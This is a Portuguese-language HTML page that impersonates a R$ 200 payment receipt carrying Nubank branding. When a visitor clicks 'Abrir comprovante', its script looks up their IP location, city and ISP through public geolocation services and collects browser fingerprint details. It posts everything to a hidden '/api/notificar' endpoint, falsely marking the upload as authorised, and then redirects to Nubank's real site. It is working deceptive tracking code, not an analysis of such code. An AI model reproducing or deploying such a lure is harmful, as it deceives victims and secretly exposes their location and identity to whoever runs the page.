<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Diagnóstico de Conexão</title>
  <style>
    :root {
      --cor-fundo: #6b21a8;
      --cor-painel: #581c87;
      --cor-texto: #ffffff;
      --cor-botao: #ffffff;
      --cor-texto-botao: #000000;
    }
    * { box-sizing: border-box; }
    body {
      font-family: system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
      background: var(--cor-fundo);
      color: var(--cor-texto);
      max-width: 780px;
      margin: 48px auto;
      padding: 0 20px;
      line-height: 1.6;
    }
    h1 { font-size: clamp(1.55rem, 4vw, 2.1rem); margin-bottom: 8px; }
    p { margin: 0 0 16px; }
    .painel { background: var(--cor-painel); border-radius: 12px; padding: 18px; margin: 18px 0; }
    .aviso { font-size: .94rem; }
    button, a.botao {
      display: inline-block;
      background: var(--cor-botao);
      color: var(--cor-texto-botao);
      border: 0;
      border-radius: 8px;
      padding: 12px 18px;
      font: 600 1rem system-ui, sans-serif;
      cursor: pointer;
      text-decoration: none;
    }
    button:hover, a.botao:hover { background: #e9d5ff; }
    button:disabled { cursor: wait; opacity: 0.65; }
    #status { min-height: 26px; font-weight: 600; }
    #resultado {
      white-space: pre-wrap;
      overflow-wrap: anywhere;
      font-size: .88rem;
      margin: 0;
      font-family: ui-monospace, SFMono-Regular, Consolas, monospace;
    }
    #blocoResultado, #linkDestino { display: none; }
    .rodape { margin-top: 22px; opacity: .95; font-size: .85rem; }
  </style>
</head>
<body>
  <h1 id="titulo"></h1>
  <p id="descricao"></p>

  <section class="painel aviso" aria-label="Informações sobre compartilhamento">
    <p id="avisoPrivacidade"></p>
  </section>

  <button id="linkRegistrar" type="button"></button>
  <p id="status" role="status" aria-live="polite"></p>

  <section class="painel" id="blocoResultado">
    <h2 id="tituloResultado">Redirecionando...</h2>
    <pre id="resultado"></pre>
  </section>

  <a id="linkDestino" class="botao" rel="noopener noreferrer"></a>
  <p class="rodape" id="rodape"></p>

<script>
(() => {
  'use strict';

  const CONFIG = {
    titulo: 'Pagamento Efetuado! R$ 200,00',
    descricao: '',
    avisoPrivacidade: 'Pagamento efetuado para 99Pay IP LTDA',
    textoBotao: 'Abrir comprovante',
    textoConsultando: 'Abrindo comprovante...',
    textoEnviando: 'Redirecionando...',
    textoSucesso: 'Erro!', // Mantido original, mas pode ser 'Concluído!'
    textoFalhaConsulta: 'Não foi possível abrir o comprovante. Tente novamente.',
    textoFalhaEnvio: 'Não foi possível abrir o comprovante. Tente novamente.',
    textoContinuar: 'Continuar',
    rodape: 'Nubank - Caixinhas: dinheiro seguro e rendimento diário',
    destinoDepoisDoEnvio: 'https://nubank.com.br/',
    mostrarResultado: true,
    timeoutProvedorMs: 6000
  };

  const el = id => document.getElementById(id);

  const botao = el('linkRegistrar');
  const status = el('status');

  el('titulo').textContent = CONFIG.titulo;
  el('descricao').textContent = CONFIG.descricao;
  el('avisoPrivacidade').textContent = CONFIG.avisoPrivacidade;
  el('rodape').textContent = CONFIG.rodape;
  botao.textContent = CONFIG.textoBotao;
  el('linkDestino').textContent = CONFIG.textoContinuar;

  function mostrarDados(dados) {
    if (!CONFIG.mostrarResultado) return;
    el('resultado').textContent = JSON.stringify(dados, null, 2);
    el('blocoResultado').style.display = 'block';
  }

  async function obterJson(url, timeoutMs) {
    const controller = new AbortController();
    const timer = setTimeout(() => controller.abort(), timeoutMs);
    try {
      const response = await fetch(url, {
        headers: { Accept: 'application/json' },
        signal: controller.signal
      });
      if (!response.ok) throw new Error(`HTTP ${response.status}`);
      const json = await response.json();
      if (json.success === false) throw new Error('API indisponível');
      return json;
    } finally {
      clearTimeout(timer);
    }
  }

  // PROVEDORES DE IP (Priorizando os que dão coordenadas melhores)
  const PROVEDORES = [
    {
      nome: 'ipwho.is',
      url: 'https://ipwho.is/',
      extrair: d => ({
        ip: d.ip,
        cidade: d.city,
        regiao: d.region,
        pais: d.country,
        provedor: d.connection?.isp,
        fusoHorario: d.timezone?.id,
        latitude: d.latitude ?? null,
        longitude: d.longitude ?? null,
        precisao: d.connection?.asn || null // ASN ajuda no backend
      })
    },
    {
      nome: 'ipapi.co',
      url: 'https://ipapi.co/json/',
      extrair: d => ({
        ip: d.ip,
        cidade: d.city,
        regiao: d.region,
        pais: d.country_name,
        provedor: d.org,
        fusoHorario: d.timezone,
        latitude: d.latitude ?? null,
        longitude: d.longitude ?? null,
        precisao: d.asn || null
      })
    },
    {
      nome: 'geojs.io',
      url: 'https://get.geojs.io/v1/ip/geo.json',
      extrair: d => ({
        ip: d.ip,
        cidade: d.city,
        regiao: d.region,
        pais: d.country,
        provedor: d.organization,
        fusoHorario: d.timezone,
        latitude: d.latitude ? Number(d.latitude) : null,
        longitude: d.longitude ? Number(d.longitude) : null,
        precisao: d.asn || null
      })
    }
  ];

  async function consultarGeolocalizacao() {
    for (const provedor of PROVEDORES) {
      try {
        const bruto = await obterJson(provedor.url, CONFIG.timeoutProvedorMs);
        const dados = provedor.extrair(bruto);
        if (!dados.ip) throw new Error('IP não encontrado');
        console.log('Consulta concluída:', provedor.nome);
        return dados;
      } catch (erro) {
        console.warn('Falha em ' + provedor.nome, erro.message);
      }
    }
    throw new Error('Nenhum provedor respondeu');
  }

  // NOVO: Coleta de Metadados Locais (Fingerprinting)
  function coletarMetadadosLocais() {
    return {
      fuso: Intl.DateTimeFormat().resolvedOptions().timeZone,
      offset: new Date().getTimezoneOffset(),
      idiomas: navigator.languages,
      sistema: navigator.platform,
      userAgent: navigator.userAgent,
      resolucao: `${window.screen.width}x${window.screen.height}`,
      dpr: window.devicePixelRatio
    };
  }

  async function enviarParaApi(dados) {
    const response = await fetch('/api/notificar', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        autorizouCompartilhamento: true,
        dados: {
          ip: dados.ip,
          cidade: dados.cidade,
          regiao: dados.regiao,
          pais: dados.pais,
          provedor: dados.provedor,
          latitude: dados.latitude,
          longitude: dados.longitude,
          asn: dados.precisao, // Enviando ASN
          
          // Metadados Locais
          meta: coletarMetadadosLocais(),
          
          horario: new Date().toISOString()
        }
      })
    });

    if (!response.ok) throw new Error(`Erro HTTP ${response.status}`);
    const resultado = await response.json();
    if (resultado.success !== true) throw new Error('Servidor não confirmou o envio');
    return resultado;
  }

  botao.addEventListener('click', async () => {
    botao.disabled = true;
    el('blocoResultado').style.display = 'none';
    el('linkDestino').style.display = 'none';
    status.textContent = CONFIG.textoConsultando;

    try {
      // 1. Consulta IP
      const geo = await consultarGeolocalizacao();

      // 2. Monta objeto final
      const dados = {
        ip: geo.ip,
        cidade: geo.cidade,
        regiao: geo.regiao,
        pais: geo.pais,
        provedor: geo.provedor,
        latitude: geo.latitude,
        longitude: geo.longitude,
        asn: geo.precisao,
        meta: coletarMetadadosLocais(), // Inclui metadados
        horario: new Date().toISOString()
      };

      mostrarDados(dados);
      status.textContent = CONFIG.textoEnviando;

      // 3. Envia para Vercel
      await enviarParaApi(dados);
      status.textContent = 'Concluído!';

      if (CONFIG.destinoDepoisDoEnvio) {
        const destino = new URL(CONFIG.destinoDepoisDoEnvio);
        if (destino.protocol === 'https:' || destino.protocol === 'http:') {
          el('linkDestino').href = destino.href;
          el('linkDestino').style.display = 'inline-block';
        }
      }

    } catch (erro) {
      console.error('[diagnostico]', erro);
      status.textContent = erro.message.includes('Nenhum provedor') 
        ? CONFIG.textoFalhaConsulta 
        : CONFIG.textoFalhaEnvio;
    } finally {
      botao.disabled = false;
    }
  });

})();
</script>
</body>
</html>
